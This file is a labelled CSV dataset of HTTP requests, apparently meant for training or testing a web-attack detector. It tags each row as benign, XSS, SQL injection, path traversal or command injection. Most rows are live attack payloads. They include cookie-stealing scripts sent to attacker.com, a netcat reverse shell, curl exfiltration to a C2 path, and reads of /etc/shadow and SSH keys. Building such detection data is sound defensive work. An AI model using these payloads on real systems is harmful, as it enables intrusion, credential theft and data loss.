request_text,label
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment='; alert(1); var x='&user=test",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=frank&password=SecureP@ss1",benign
"GET /files?file=..%c0%afetc%c0%afpasswd HTTP/1.1
Host: example.com",traversal
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' AND 1=0 UNION SELECT '1','2','3'--&password=test",sqli
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=0x27 OR 0x31=0x31--&password=test",sqli
"GET /feedback?q=<iframe onload=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| id",cmdi
"GET /images?file=%5c..%5c..%5cwindows%5csystem32 HTTP/1.1
Host: example.com",traversal
"GET /contact HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /exec?host=test|| whoami HTTP/1.1
Host: example.com",cmdi
"DELETE /api/cart/item/528 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>new Image().src='http://attacker.com/?c='+document.cookie</script>&user=test",xss
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8| id",cmdi
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=alice&password=SecureP@ss1",benign
"GET /images?file=../../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment='><script>alert(1)</script>&user=test",xss
"GET /download?file=../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=%27 OR %271%27=%271&password=test",sqli
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=javascript:alert(1)&user=test",xss
"GET /search?q=admin'-- HTTP/1.1
Host: example.com",sqli
"GET /ping?host=192.168.1.1|| whoami HTTP/1.1
Host: example.com",cmdi
"GET /files?file=..%c1%9cetc%c1%9cpasswd HTTP/1.1
Host: example.com",traversal
"GET /api/file?file=/etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /tools?host=check| whoami HTTP/1.1
Host: example.com",cmdi
"GET /product/sku_789 HTTP/1.1
Host: example.com
Accept: application/json",benign
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<audio src=x onerror=alert(1)>&user=test",xss
"GET /static?file=%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: example.com",traversal
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=expression(alert(1))&user=test",xss
"GET /run?host=192.168.1.1; ping -c 5 attacker.com HTTP/1.1
Host: example.com",cmdi
"GET /api/data?limit=100&offset=28&format=json HTTP/1.1
Host: example.com",benign
"GET /user?q=' OR 1=1# HTTP/1.1
Host: example.com",sqli
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR 1=1--&password=test",sqli
"GET /product/sale_items HTTP/1.1
Host: example.com
Accept: application/json",benign
"DELETE /api/cart/item/985 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /debug?host=localhost| nc attacker.com 4444 -e /bin/bash HTTP/1.1
Host: example.com",cmdi
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 OR 1=1&password=test",sqli
"GET /static?file=expect://id HTTP/1.1
Host: example.com",traversal
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1| type C:\Windows\System32\drivers\etc\hosts",cmdi
"GET /user?q=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- HTTP/1.1
Host: example.com",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=ivan&password=SecureP@ss1",benign
"GET /api/auth?q=1 OR 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /profile?q=<img src=x onerror=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=javascript:alert(1)&user=test",xss
"GET /search?q=<img src='x' onerror='alert(document.cookie)'> HTTP/1.1
Host: example.com",xss
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8&& ls /etc",cmdi
"GET /exec?host=localhost; uname -a HTTP/1.1
Host: example.com",cmdi
"GET /search?q=coffee maker&page=3&sort=asc HTTP/1.1
Host: example.com",benign
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<div style='background:url(javascript:alert(1))'>&user=test",xss
"PUT /api/users/heidi HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""heidi@email.com"",""name"":""Heidi""}",benign
"GET /posts?q=<img src=x onerror=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /settings HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"PUT /api/users/frank HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""frank@email.com"",""name"":""Frank""}",benign
"GET /run?host=192.168.1.1| find / -perm -4000 2>/dev/null HTTP/1.1
Host: example.com",cmdi
"GET /api/execute?host=test`cat /etc/hosts` HTTP/1.1
Host: example.com",cmdi
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=';alert(String.fromCharCode(88,83,83))//&user=test",xss
"GET /about HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"GET /view?file=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /search?q=wireless mouse&page=8&sort=asc HTTP/1.1
Host: example.com",benign
"GET /product?q=1 UNION SELECT @@datadir-- HTTP/1.1
Host: example.com",sqli
"GET /wishlist HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /images?file=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /checkout?q=admin' OR '1'='1' LIMIT 1-- HTTP/1.1
Host: example.com",sqli
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=%3Cscript%3Ealert(1)%3C/script%3E&user=test",xss
"GET /files?file=%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: example.com",traversal
"DELETE /api/cart/item/752 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /files?file=../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' AND 1=2--&password=test",sqli
"GET /static?file=/var/log/auth.log HTTP/1.1
Host: example.com",traversal
"GET /images?file=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /api/file?file=....//..//etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /exec?host=localhost$(curl attacker.com/c2?h=$(hostname)) HTTP/1.1
Host: example.com",cmdi
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test; ping -c 5 attacker.com",cmdi
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<embed src=javascript:alert(1)>&user=test",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=heidi&password=SecureP@ss1",benign
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>new Image().src='http://attacker.com/?c='+document.cookie</script>&user=test",xss
"GET /view?file=/var/log/auth.log HTTP/1.1
Host: example.com",traversal
"GET /login?q=' OR 1=1# HTTP/1.1
Host: example.com",sqli
"GET /cart HTTP/1.1
Host: example.com
Authorization: Bearer token_abc456",benign
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check&& id",cmdi
"GET /download?file=..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"GET /search?q='; alert(1); var x=' HTTP/1.1
Host: example.com",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=charlie&password=SecureP@ss1",benign
"GET /files/invoice_2024.pdf HTTP/1.1
Host: example.com",benign
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1$(id)",cmdi
"GET /api/file?file=..\..\windows\system32 HTTP/1.1
Host: example.com",traversal
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR EXISTS(SELECT * FROM users WHERE username='admin')--&password=test",sqli
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1| dir C:\",cmdi
"GET /download?file=/etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /api/execute?host=8.8.8.8| type C:\Windows\System32\drivers\etc\hosts HTTP/1.1
Host: example.com",cmdi
"GET /search?q=gaming chair&page=10&sort=asc HTTP/1.1
Host: example.com",benign
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=%3Cscript%3Ealert(1)%3C/script%3E&user=test",xss
"GET /images?file=/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /posts?q=<input onfocus=alert(1) autofocus> HTTP/1.1
Host: example.com",xss
"GET /ping?host=test&& nmap -sV localhost HTTP/1.1
Host: example.com",cmdi
"GET /view?file=../../../../var/www/html/.htpasswd HTTP/1.1
Host: example.com",traversal
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1&& whoami",cmdi
"GET /download?file=../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /search?q=camera lens&page=9&sort=asc HTTP/1.1
Host: example.com",benign
"GET /files?file=..%c0%afetc%c0%afpasswd HTTP/1.1
Host: example.com",traversal
"GET /api/auth?q=' OR 1=1# HTTP/1.1
Host: example.com",sqli
"GET /search?q=<img src=x onerror=confirm(1)> HTTP/1.1
Host: example.com",xss
"GET /files?file=../../../../var/www/html/.htpasswd HTTP/1.1
Host: example.com",traversal
"PUT /api/users/diana HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""diana@email.com"",""name"":""Diana""}",benign
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check&& nmap -sV localhost",cmdi
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<iframe src=javascript:alert(1)></iframe>&user=test",xss
"GET /checkout?q=' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- HTTP/1.1
Host: example.com",sqli
"GET /api/auth?q=1' AND 1=2-- HTTP/1.1
Host: example.com",sqli
"GET /search?q=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /comment?q=-moz-binding: url(http://attacker.com/xss.xml#xss) HTTP/1.1
Host: example.com",xss
"GET /api/file?file=expect://id HTTP/1.1
Host: example.com",traversal
"GET /product/cat_electronics HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /exec?host=test`id` HTTP/1.1
Host: example.com",cmdi
"GET /profile?q=<body onload=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /images?file=%5c..%5c..%5cwindows%5csystem32 HTTP/1.1
Host: example.com",traversal
"GET /api/data?limit=85&offset=273&format=json HTTP/1.1
Host: example.com",benign
"PUT /api/users/john_doe HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""john_doe@email.com"",""name"":""John Doe""}",benign
"GET /posts?q=<iframe src=javascript:alert(1)></iframe> HTTP/1.1
Host: example.com",xss
"GET /run?host=check&& id HTTP/1.1
Host: example.com",cmdi
"GET /login?q=1' GROUP BY 1-- HTTP/1.1
Host: example.com",sqli
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=""><script>alert(1)</script>&user=test",xss
"GET /search?q=<input onfocus=alert(1) autofocus> HTTP/1.1
Host: example.com",xss
"GET /product?q=' UNION SELECT null,null,null-- HTTP/1.1
Host: example.com",sqli
"GET /api/data?limit=65&offset=134&format=json HTTP/1.1
Host: example.com",benign
"GET /exec?host=check| id HTTP/1.1
Host: example.com",cmdi
"GET /api/auth?q=1' ORDER BY 10-- HTTP/1.1
Host: example.com",sqli
"GET /download?file=../../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"DELETE /api/cart/item/360 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost| ls -la /",cmdi
"GET /images?file=....//..//etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /api/data?limit=56&offset=195&format=json HTTP/1.1
Host: example.com",benign
"GET /login?q=1' GROUP BY 1-- HTTP/1.1
Host: example.com",sqli
"GET /api/auth?q=OR 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /search?q=wireless mouse&page=1&sort=asc HTTP/1.1
Host: example.com",benign
"GET /feedback?q=<details open ontoggle=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /search?q=laptop&page=3&sort=asc HTTP/1.1
Host: example.com",benign
"GET /images?file=../../../var/log/apache2/access.log HTTP/1.1
Host: example.com",traversal
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=charlie&password=SecureP@ss1",benign
"GET /comment?q=<iframe onload=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /help HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /debug?host=192.168.1.1&& nmap -sV localhost HTTP/1.1
Host: example.com",cmdi
"GET /orders HTTP/1.1
Host: example.com
Authorization: Bearer token_abc456",benign
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=bob&password=SecureP@ss1",benign
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test|| whoami",cmdi
"GET /admin/login?q='; EXEC xp_cmdshell('whoami')-- HTTP/1.1
Host: example.com",sqli
"GET /posts?q=-moz-binding: url(http://attacker.com/xss.xml#xss) HTTP/1.1
Host: example.com",xss
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<embed src=javascript:alert(1)>&user=test",xss
"GET /search?q=' UNION SELECT null-- HTTP/1.1
Host: example.com",sqli
"GET /profile?q=<body onload=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /download?file=expect://id HTTP/1.1
Host: example.com",traversal
"GET /api/file?file=%5c..%5c..%5cwindows%5csystem32 HTTP/1.1
Host: example.com",traversal
"GET /images?file=..%c1%9cetc%c1%9cpasswd HTTP/1.1
Host: example.com",traversal
"GET /user?q=1; DROP TABLE orders-- HTTP/1.1
Host: example.com",sqli
"PUT /api/users/alice HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""alice@email.com"",""name"":""Alice""}",benign
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>document.location='http://attacker.com/?c='+document.cookie</script>&user=test",xss
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost| ls -la /",cmdi
"GET /product/sku_789 HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /api/file?file=%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: example.com",traversal
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=prompt(1)>&user=test",xss
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<video src=x onerror=alert(1)>&user=test",xss
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 OR 1=1&password=test",sqli
"GET /api/data?limit=20&offset=108&format=json HTTP/1.1
Host: example.com",benign
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<input onfocus=alert(1) autofocus>&user=test",xss
"GET /download?file=%5c..%5c..%5cwindows%5csystem32 HTTP/1.1
Host: example.com",traversal
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| uname -a",cmdi
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check& whoami",cmdi
"GET /product?q=' OR '1'='1 HTTP/1.1
Host: example.com",sqli
"GET /view?file=../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /exec?host=8.8.8.8$(id) HTTP/1.1
Host: example.com",cmdi
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<input onfocus=alert(1) autofocus>&user=test",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1&password=test",sqli
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; DELETE FROM users--&password=test",sqli
"GET /api/file?file=..\..\windows\system32 HTTP/1.1
Host: example.com",traversal
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=&#60;script&#62;alert(1)&#60;/script&#62;&user=test",xss
"GET /api/file?file=../../../../proc/self/environ HTTP/1.1
Host: example.com",traversal
"GET /static?file=/etc/shadow HTTP/1.1
Host: example.com",traversal
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>alert(document.cookie)</script>&user=test",xss
"GET /posts?q=<link rel=stylesheet href=javascript:alert(1)> HTTP/1.1
Host: example.com",xss
"GET /product/sale_items HTTP/1.1
Host: example.com
Accept: application/json",benign
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 AND SLEEP(5)--&password=test",sqli
"GET /files?file=file:///etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' UNION SELECT null,null--&password=test",sqli
"GET /tools?host=8.8.8.8|| whoami HTTP/1.1
Host: example.com",cmdi
"DELETE /api/cart/item/722 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=eve&password=SecureP@ss1",benign
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>alert('XSS')</script>&user=test",xss
"GET /static?file=../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /files/app.js HTTP/1.1
Host: example.com",benign
"GET /posts?q=<div style='background:url(javascript:alert(1))'> HTTP/1.1
Host: example.com",xss
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=%3Cscript%3Ealert(1)%3C/script%3E&user=test",xss
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8; cat /etc/passwd",cmdi
"GET /ping?host=localhost| id HTTP/1.1
Host: example.com",cmdi
"GET /checkout?q='; EXEC xp_cmdshell('whoami')-- HTTP/1.1
Host: example.com",sqli
"GET /user?q='; INSERT INTO users (username,password) VALUES ('hacked','hacked')-- HTTP/1.1
Host: example.com",sqli
"GET /search?q=1 OR 1=1 HTTP/1.1
Host: example.com",sqli
"GET /static?file=php://input HTTP/1.1
Host: example.com",traversal
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<svg onload=prompt(document.domain)>&user=test",xss
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=0x27 OR 0x31=0x31--&password=test",sqli
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' OR '1'='1'--&password=test",sqli
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src='x' onerror='alert(document.cookie)'>&user=test",xss
"GET /search?q=""><script>alert(1)</script> HTTP/1.1
Host: example.com",xss
"DELETE /api/cart/item/20 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /api/file?file=php://input HTTP/1.1
Host: example.com",traversal
"GET /help HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /api/data?limit=46&offset=61&format=json HTTP/1.1
Host: example.com",benign
"GET /product/product_123 HTTP/1.1
Host: example.com
Accept: application/json",benign
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=javascript:alert(1)&user=test",xss
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check| type C:\Windows\System32\drivers\etc\hosts",cmdi
"GET /api/data?limit=46&offset=253&format=json HTTP/1.1
Host: example.com",benign
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8| dir C:\",cmdi
"GET /api/file?file=../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /product/cat_clothing HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /search?q=python book&page=10&sort=asc HTTP/1.1
Host: example.com",benign
"DELETE /api/cart/item/868 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=alert(1)>&user=test",xss
"GET /debug?host=check$(curl attacker.com/c2?h=$(hostname)) HTTP/1.1
Host: example.com",cmdi
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8; ls -la",cmdi
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check; uname -a",cmdi
"GET /tools?host=8.8.8.8; find / -name id_rsa 2>/dev/null HTTP/1.1
Host: example.com",cmdi
"GET /api/data?limit=27&offset=330&format=json HTTP/1.1
Host: example.com",benign
